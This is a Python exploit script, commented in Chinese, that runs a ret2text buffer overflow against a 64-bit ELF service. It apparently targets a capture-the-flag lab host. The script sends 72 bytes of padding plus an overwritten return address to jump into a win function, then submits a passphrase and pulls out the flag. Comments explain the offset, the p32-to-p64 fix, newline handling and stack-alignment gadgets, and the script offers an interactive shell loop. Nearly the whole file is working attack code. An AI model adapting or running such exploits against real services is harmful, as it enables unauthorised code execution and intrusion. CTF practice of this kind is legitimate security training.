#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ret2text exploit —— 64 位 ELF 靶机（socket 裸写版）
=====================================================================
流程：第一次输入溢出 -> 跳到 WIN(0x4011D6) -> 第二次输入口令 KEY

改动说明（相对你原来那版）：
  1) p32 -> p64                     <-- 打不通的真正原因，见下面注释
  2) 两次输入都补 '\n'               <-- 服务端多半是"读到换行才算一次输入"
  3) 先收 banner，响应分开发分开打印  <-- 才能分清是哪一步挂的
用法: python 脚本.py
=====================================================================
"""
import re
import socket
import struct
import time

# ------------------------------------------------------------------
TARGET_IP = '172.17.0.13'
TARGET_PORT = 12312

OFFSET = 72                  # 缓冲区 64 字节 + 保存的 rbp 8 字节（64 位！）
WIN = 0x4011D6               # 溢出后要跳去的函数
KEY = b'xK9!mQ#2vL@pR7nZ'    # 第二次输入的内容

NEWLINE = True               # 每次发送都补 '\n'。纯 read() 也无害；fgets/scanf 必须要
ALIGN_RET = None             # 若崩在 movaps/xmm 等 SSE 指令，填一个 ret gadget（如 0x40101A）
# ------------------------------------------------------------------


def p64(x):
    """64 位地址 -> 8 字节小端。原来用 p32 只给了 4 字节，地址高位全是垃圾。"""
    return struct.pack('<Q', x & 0xFFFFFFFFFFFFFFFF)


def p32(x):
    return struct.pack('<I', x & 0xFFFFFFFF)


def recv_all(s, timeout):
    s.settimeout(timeout)
    out = b''
    while True:
        try:
            d = s.recv(4096)
            if not d:            # 对端关闭/进程崩了
                break
            out += d
        except socket.timeout:   # 超时 = 该说的都说了，收工
            break
        except OSError:
            break
    return out


def build_payload():
    pl = b'A' * OFFSET
    if ALIGN_RET:
        pl += p64(ALIGN_RET)     # 先落到一个 ret，修正 16 字节栈对齐
    pl += p64(WIN)
    return pl


def send(s, data):
    s.sendall(data + (b'\n' if NEWLINE else b''))


def main():
    pl = build_payload()
    print('[*] 目标     = %s:%d' % (TARGET_IP, TARGET_PORT))
    print('[*] OFFSET   = %d' % OFFSET)
    print('[*] WIN      = 0x%X' % WIN)
    print('[*] payload  = %s  (%d 字节)' % (pl.hex(), len(pl)))

    if b'\n' in pl or b'\r' in pl:
        print('[!] payload 里有 CR/LF，会被逐行读的输入函数截断，换个地址或走 gadget')
        return 1

    s = socket.create_connection((TARGET_IP, TARGET_PORT), timeout=8)

    # 1) 先把 banner 收干净再发，否则 banner 会混进 resp1 里骗你
    banner = recv_all(s, 2.0)
    print('[<] banner   = %r' % banner)

    # 2) 第一次输入：溢出
    send(s, pl)
    resp1 = recv_all(s, 2.0)
    print('[<] resp1(%d) = %r' % (len(resp1), resp1))
    if not resp1:
        print('[-] 没有任何回显 -> 基本可以确定 rip 跳飞了')
        print('    依次核：OFFSET 是不是 buf+8、WIN 地址对不对、'
              '程序是不是 32 位（32 位要 p32 且 OFFSET=buf+4）')
        s.close()
        return 1

    # 3) 第二次输入：口令 / key
    time.sleep(0.5)
    send(s, KEY)
    resp2 = recv_all(s, 5.0)
    print('[<] resp2(%d) = %r' % (len(resp2), resp2))

    if not resp2:
        print('[-] 第二步没回显：口令被当成上一步的结束符吃掉了？'
              '或服务端在读定长块（试试 NEWLINE=False 或把两次发送合成一次）')

    m = re.search(r'[A-Za-z][A-Za-z0-9_]{1,15}\{[^}\r\n]{1,256}\}', resp2.decode('utf-8', 'replace'))
    if m:
        print()
        print('[+] FLAG = %s' % m.group(0))

    # 想手动接着交互就放开下面三行（Ctrl-C 退出）
    # while True:
    #     cmd = input('> ').encode()
    #     send(s, cmd)
    #     print(recv_all(s, 3.0))

    s.close()
    return 0


if __name__ == '__main__':
    raise SystemExit(main())
